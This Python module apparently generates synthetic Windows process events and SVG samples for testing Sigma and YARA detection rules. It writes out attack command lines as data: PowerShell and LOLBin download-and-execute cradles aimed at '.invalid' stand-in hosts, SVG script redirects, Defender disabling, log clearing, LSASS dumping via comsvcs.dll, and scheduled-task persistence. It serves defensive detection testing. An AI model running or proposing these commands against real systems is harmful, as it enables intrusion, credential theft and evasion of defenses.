"""Prompt Engine: Generative threat scenario engine and permutation generator."""

from __future__ import annotations

import base64
import random
import re
import uuid
from typing import Dict, List, Tuple

from .models import Variant


class PromptEngine:
    """Parses natural-language threat directives and generates synthetic test variants."""

    LOLBINS_MAP = {
        "powershell": ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe"),
        "pwsh": ("C:\\Program Files\\PowerShell\\7\\pwsh.exe", "pwsh.exe"),
        "cmd": ("C:\\Windows\\System32\\cmd.exe", "cmd.exe"),
        "mshta": ("C:\\Windows\\System32\\mshta.exe", "mshta.exe"),
        "curl": ("C:\\Windows\\System32\\curl.exe", "curl.exe"),
        "rundll32": ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe"),
        "wscript": ("C:\\Windows\\System32\\wscript.exe", "wscript.exe"),
        "cscript": ("C:\\Windows\\System32\\cscript.exe", "cscript.exe"),
        "certutil": ("C:\\Windows\\System32\\certutil.exe", "certutil.exe"),
        "bitsadmin": ("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin.exe"),
        "regsvr32": ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe"),
        "msiexec": ("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe"),
        "pcalua": ("C:\\Windows\\System32\\pcalua.exe", "pcalua.exe"),
        "hh": ("C:\\Windows\\System32\\hh.exe", "hh.exe"),
        "conhost": ("C:\\Windows\\System32\\conhost.exe", "conhost.exe"),
        "wt": ("C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19\\wt.exe", "wt.exe"),
    }

    def generate_from_prompt(self, prompt: str, target_type: str = "sigma") -> Variant:
        """Translates an arbitrary operator prompt directive into a safe synthetic variant."""
        prompt_lower = prompt.lower()
        var_id = f"prompt-{uuid.uuid4().hex[:8]}"

        if target_type == "yara":
            return self._build_yara_variant(var_id, prompt, prompt_lower)
        return self._build_sigma_variant(var_id, prompt, prompt_lower)

    def _build_sigma_variant(self, var_id: str, raw_prompt: str, p: str) -> Variant:
        # 1. Identify LOLBin with priority for proxy/wrapper tools
        selected_bin = "powershell"
        if "pcalua" in p:
            selected_bin = "pcalua"
        elif "wt" in p or "terminal" in p:
            selected_bin = "wt"
        elif "hh" in p:
            selected_bin = "hh"
        elif "conhost" in p:
            selected_bin = "conhost"
        elif "stdin" in p or "pipe" in p:
            selected_bin = "powershell"
        else:
            for bin_name in self.LOLBINS_MAP:
                if bin_name in p:
                    selected_bin = bin_name
                    break

        full_path, bin_exec = self.LOLBINS_MAP[selected_bin]

        # 2. WindowStyle switches
        window_flag = "-w hidden"
        if "-w 1" in p or "numeric" in p or "integer" in p:
            window_flag = "-w 1"
        elif "-w h" in p or "short" in p or "abbreviat" in p:
            window_flag = "-w h"
        elif "normal" in p:
            window_flag = ""

        # 3. Destination URI (Strictly RFC 2606)
        dest_domain = "https://cdn.delivery.stage.invalid/update"

        # 4. Construct Command Line based on LOLBin & Evasion Style
        axis = "syntax"
        if "pcalua" in p:
            cmd = f'pcalua.exe -a powershell.exe -c "irm {dest_domain}.ps1 | iex"'
            axis = "lolbin_proxy"
        elif "stdin" in p or "pipe" in p:
            cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -"
            axis = "argument_hiding"
        elif "wt" in p or "terminal" in p:
            cmd = f'wt.exe powershell.exe {window_flag} -c "irm {dest_domain}.ps1 | iex"'
            axis = "lolbin_proxy"
        elif "hh" in p:
            cmd = f"hh.exe {dest_domain}.chm"
            axis = "lolbin"
        elif selected_bin in ("powershell", "pwsh"):
            if "split" in p or "concatenat" in p:
                cmd = f'{bin_exec} {window_flag} -c "&(\'Inv\'+\'oke-RestMethod\') {dest_domain}.ps1 | iex"'
                axis = "obfuscation"
            elif "enc" in p or "base64" in p:
                encoded = base64.b64encode(b"irm https://cdn.delivery.stage.invalid/p | iex").decode("ascii")
                cmd = f"{bin_exec} {window_flag} -enc {encoded}"
                axis = "obfuscation"
            elif "downloadfile" in p or "webclient" in p:
                cmd = f'{bin_exec} {window_flag} -c "(New-Object Net.WebClient).DownloadFile(\'{dest_domain}.exe\',\'%TEMP%\\x.exe\')"'
                axis = "syntax"
            else:
                cmd = f'{bin_exec} {window_flag} -c "irm {dest_domain}.ps1 | iex"'
        elif selected_bin == "cmd":
            if "start /b" in p or "background" in p:
                cmd = f"cmd.exe /c start /b powershell.exe {window_flag} -c irm {dest_domain}.ps1 | iex"
            elif "start /min" in p or "minimiz" in p:
                cmd = f"cmd.exe /c start /min powershell.exe {window_flag} -c irm {dest_domain}.ps1 | iex"
            else:
                cmd = f"cmd.exe /c powershell.exe {window_flag} -c irm {dest_domain}.ps1 | iex"
            axis = "syntax"
        elif selected_bin == "rundll32":
            cmd = f"rundll32.exe url.dll,FileProtocolHandler {dest_domain}.hta"
            axis = "lolbin"
        elif selected_bin in ("wscript", "cscript"):
            cmd = f"{bin_exec} //e:vbscript {dest_domain}.vbs"
            axis = "lolbin"
        elif selected_bin == "mshta":
            cmd = f"mshta.exe {dest_domain}.hta"
            axis = "lolbin"
        elif selected_bin == "curl":
            cmd = f"curl.exe -s -k {dest_domain}.bin -o %TEMP%\\drop.exe"
            axis = "lolbin"
        elif selected_bin == "certutil":
            cmd = f"certutil.exe -urlcache -split -f {dest_domain}.bin %TEMP%\\drop.exe"
            axis = "lolbin"
        elif selected_bin == "bitsadmin":
            cmd = f"bitsadmin.exe /transfer myJob /download /priority normal {dest_domain}.bin %TEMP%\\drop.exe"
            axis = "lolbin"
        elif selected_bin == "regsvr32":
            cmd = f"regsvr32.exe /s /n /u /i:{dest_domain}.sct scrobj.dll"
            axis = "lolbin"
        else:
            cmd = f"{bin_exec} {dest_domain}"
            axis = "lolbin"

        return Variant(
            id=var_id,
            target_type="sigma",
            axis=axis,
            mutation_name=f"prompt_{selected_bin}_{axis}",
            description=f"Prompt directive: {raw_prompt[:80]}",
            payload={
                "EventID": 1,
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": full_path,
                "CommandLine": cmd,
                "User": "VICTIM-PC\\analyst",
            },
            cycle=1,
        )

    def _build_yara_variant(self, var_id: str, raw_prompt: str, p: str) -> Variant:
        # Check padding
        padding_bytes = 0
        pad_match = re.search(r"(\d+)\s*(k|kb|bytes?)?", p)
        if pad_match:
            num = int(pad_match.group(1))
            unit = pad_match.group(2) or ""
            if "k" in unit:
                padding_bytes = num * 1024
            elif num > 100:
                padding_bytes = num

        prefix = ""
        if padding_bytes > 0:
            prefix = "<!-- " + ("P" * min(padding_bytes, 8192)) + " -->\n"

        # Check tag namespace
        svg_tag = "<svg"
        if "namespace" in p or "prefix" in p or "svg:svg" in p:
            svg_tag = "<svg:svg"

        # Check script style
        axis = "structural"
        if "foreignobject" in p or "meta" in p or "refresh" in p:
            body = '  <foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><meta http-equiv="refresh" content="0;url=https://auth.stage.invalid/login"/></body></foreignObject>'
            axis = "parser_differential"
        elif "animate" in p or "smil" in p:
            body = '  <animate attributeName="href" values="https://auth.stage.invalid/login" begin="0s"/><a href="#"><text>Click</text></a>'
            axis = "syntax"
        elif "cdata" in p:
            body = '  <script><![CDATA[ window.location.href = "https://auth.stage.invalid/login"; ]]></script>'
        elif "bracket" in p or "concatenat" in p:
            body = '  <script>window["loc"+"ation"]["hr"+"ef"] = "https://auth.stage.invalid/login";</script>'
            axis = "obfuscation"
        elif "onerror" in p:
            body = '  <image href="x" onerror="location.replace(\'https://auth.stage.invalid/login\')"/>'
            axis = "syntax"
        elif "onload" in p:
            body = '  <circle cx="20" cy="20" r="10" onload="location.assign(\'https://auth.stage.invalid/login\')"/>'
            axis = "syntax"
        elif "javascript:" in p:
            body = '  <a href="javascript:location.replace(\'https://auth.stage.invalid/login\')"><text>Click</text></a>'
            axis = "syntax"
        else:
            body = '  <script>window.location.href = "https://auth.stage.invalid/login";</script>'

        if svg_tag == "<svg:svg":
            payload = f'{prefix}<svg:svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg">\n{body}\n</svg:svg>'
        else:
            payload = f'{prefix}<svg xmlns="http://www.w3.org/2000/svg">\n{body}\n</svg>'

        return Variant(
            id=var_id,
            target_type="yara",
            axis=axis,
            mutation_name=f"prompt_svg_{axis}",
            description=f"Prompt directive: {raw_prompt[:80]}",
            payload=payload,
            cycle=1,
        )

    def generate_novel_hypothesis(self, target_type: str = "sigma", index: int = 1) -> Tuple[str, Variant]:
        """Generates a novel threat hypothesis prompt and its corresponding variant."""
        if target_type == "yara":
            templates = [
                ("SVG with 2KB comment header pushing root element", "Probe YARA scan window with 2048 bytes of comment padding"),
                ("SVG using <svg:svg> XML namespace alias", "Test SVG parsing with namespace prefix <svg:svg> and location.replace"),
                ("SVG foreignObject HTML meta-refresh redirect", "Test SVG foreignObject containing HTML meta-refresh redirect to external URL"),
                ("SVG dynamic property concatenation", "Test JavaScript bracket access window['location']['href'] to evade literal strings"),
                ("SVG SMIL animation href redirection", "Test SVG SMIL animate attributeName href redirecting without script tags"),
                ("SVG CDATA enclosed script block", "Evaluate script execution wrapped in CDATA encapsulation with external https URI"),
                ("SVG onerror image redirect handler", "Test image element triggering onerror event handler to redirect browser"),
                ("SVG with 4.5KB comment padding (boundary push)", "Probe boundary beyond 4096 bytes using 4500 bytes of XML comment padding"),
            ]
            desc, prompt = templates[index % len(templates)]
            return prompt, self.generate_from_prompt(prompt, target_type="yara")

        templates = [
            ("PowerShell with integer -w 1 switch alias", "Test ClickFix PowerShell execution with integer window switch -w 1"),
            ("Explorer launching pcalua.exe as LOLBin proxy", "Simulate Explorer launching pcalua.exe to proxy powershell download"),
            ("PowerShell with abbreviated -w h switch alias", "Simulate PowerShell execution with abbreviated -w h switch"),
            ("CMD stdin pipe injection into powershell", "Simulate CMD streaming download payload via stdin pipe into powershell"),
            ("PowerShell with split Invoke-RestMethod cmdlet", "Probe cmdlet splitting &('Inv'+'oke-RestMethod') with download"),
            ("Rundll32 URL Protocol Handler invocation", "Simulate Explorer spawning rundll32 url.dll,FileProtocolHandler to remote HTA"),
            ("Explorer launching Windows Terminal wrapper wt.exe", "Simulate Explorer spawning wt.exe to wrap powershell execution"),
            ("Windows Script Host remote script execution", "Test Explorer spawning wscript.exe with remote https VBScript destination"),
            ("Explorer launching HTML Help hh.exe", "Test Explorer spawning hh.exe targeting remote CHM payload"),
            ("Curl silent background download cradle", "Test Explorer spawning curl.exe downloading binary payload to temp directory"),
            ("CMD start /b background PowerShell staging", "Simulate CMD launching background PowerShell cradle using start /b"),
            ("Certutil living-off-the-land remote download", "Test Explorer spawning certutil.exe -urlcache -split to fetch remote payload"),
            ("Bitsadmin background transfer job execution", "Simulate Explorer spawning bitsadmin.exe to download remote executable"),
            ("MSHTA remote HTA application launcher", "Test Explorer spawning mshta.exe targeting remote https payload"),
        ]
        desc, prompt = templates[index % len(templates)]
        return prompt, self.generate_from_prompt(prompt, target_type="sigma")

    def generate_stage_variant(
        self, stage: int, cycle: int = 1, evasive: bool = False
    ) -> Tuple[str, str, str, Variant]:
        """Generates a synthetic variant tailored for a specific kill chain stage."""
        var_id = f"stage{stage}-{uuid.uuid4().hex[:8]}"

        if stage == 1:
            stage_name = "Initial Access"
            tactic = "Initial Access"
            technique_id = "T1566.001"
            if evasive:
                prompt = "Test SVG foreignObject containing HTML meta-refresh redirect to external URL"
            else:
                prompt = "SVG image redirecting on load via location.replace to auth.stage.invalid"
            variant = self.generate_from_prompt(prompt, target_type="yara")
            variant.id = var_id
            variant.cycle = cycle
            return stage_name, tactic, technique_id, variant

        elif stage == 2:
            stage_name = "Execution"
            tactic = "Execution"
            technique_id = "T1204.002"
            if evasive:
                prompt = "Simulate Explorer launching pcalua.exe to proxy powershell download"
            else:
                prompt = "Test Explorer launching PowerShell hidden downloadstring cradle"
            variant = self.generate_from_prompt(prompt, target_type="sigma")
            variant.id = var_id
            variant.cycle = cycle
            return stage_name, tactic, technique_id, variant

        elif stage == 3:
            stage_name = "Defense Evasion"
            tactic = "Defense Evasion"
            technique_id = "T1070.001"
            if evasive:
                cmd = "powershell.exe -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true"
                image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            else:
                cmd = "wevtutil.exe cl Security"
                image = "C:\\Windows\\System32\\wevtutil.exe"

            payload = {
                "EventID": 1,
                "UtcTime": "2026-09-03 14:00:00.000",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": image,
                "CommandLine": cmd,
                "User": "VICTIM-PC\\analyst",
            }
            variant = Variant(
                id=var_id,
                target_type="sigma",
                axis="tampering" if evasive else "log_clearing",
                mutation_name="tamper_defense" if evasive else "clear_eventlog",
                description="Simulate post-compromise defense evasion",
                payload=payload,
                cycle=cycle,
            )
            return stage_name, tactic, technique_id, variant

        elif stage == 4:
            stage_name = "Credential Access"
            tactic = "Credential Access"
            technique_id = "T1003.001"
            if evasive:
                cmd = "rundll32.exe comsvcs.dll, #24 624 C:\\Users\\analyst\\AppData\\Local\\Temp\\dump.bin full"
            else:
                cmd = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full"

            payload = {
                "EventID": 1,
                "UtcTime": "2026-09-03 14:00:05.000",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "CommandLine": cmd,
                "User": "NT AUTHORITY\\SYSTEM",
            }
            variant = Variant(
                id=var_id,
                target_type="sigma",
                axis="ordinal_invoke" if evasive else "named_export",
                mutation_name="comsvcs_ordinal" if evasive else "comsvcs_minidump",
                description="Simulate LSASS memory dumping via comsvcs.dll",
                payload=payload,
                cycle=cycle,
            )
            return stage_name, tactic, technique_id, variant

        else:  # stage == 5
            stage_name = "Persistence"
            tactic = "Persistence"
            technique_id = "T1053.005"
            if evasive:
                cmd = 'schtasks.exe /create /tn "SystemHealth" /tr "cmd.exe /c curl.exe https://cdn.stage.invalid/p.bin -o %TEMP%\\p.exe" /sc minute /mo 15'
            else:
                cmd = 'schtasks.exe /create /tn "OneDrive Update" /tr "powershell.exe -w hidden -c irm https://cdn.stage.invalid/update.ps1 | iex" /sc onlogon /ru SYSTEM'

            payload = {
                "EventID": 1,
                "UtcTime": "2026-09-03 14:00:10.000",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": "C:\\Windows\\System32\\schtasks.exe",
                "CommandLine": cmd,
                "User": "NT AUTHORITY\\SYSTEM",
            }
            variant = Variant(
                id=var_id,
                target_type="sigma",
                axis="recurring_minute" if evasive else "logon_trigger",
                mutation_name="schtasks_minute" if evasive else "schtasks_onlogon",
                description="Simulate scheduled task persistence creation",
                payload=payload,
                cycle=cycle,
            )
            return stage_name, tactic, technique_id, variant
